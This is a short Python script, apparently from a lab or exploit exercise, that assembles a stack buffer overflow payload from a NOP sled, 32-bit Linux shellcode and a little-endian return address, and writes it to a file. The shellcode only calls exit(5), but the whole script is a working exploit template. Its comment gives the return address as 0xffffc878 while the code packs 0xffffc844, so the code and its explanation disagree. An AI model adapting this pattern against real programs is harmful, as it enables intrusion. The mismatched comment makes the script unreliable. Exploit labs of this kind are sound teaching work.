import struct

# Step 1: NOP sled (42 bytes of 0x90)
nop_sled = b"\x90" * 42

# Step 2: Shellcode bytes (you wrote them space-separated, now convert properly)
shellcode = bytes.fromhex("31 c0 b0 01 31 db b3 05 cd 80")

# Step 3: Return address (0xffffc878) in little-endian
ret_addr = struct.pack("<I", 0xffffc844)

# Final payload
payload = nop_sled + shellcode + ret_addr

# Optional: print or write to file
print(payload.hex())   # Show as hex string
with open("payload.bin", "wb") as f:
    f.write(payload)
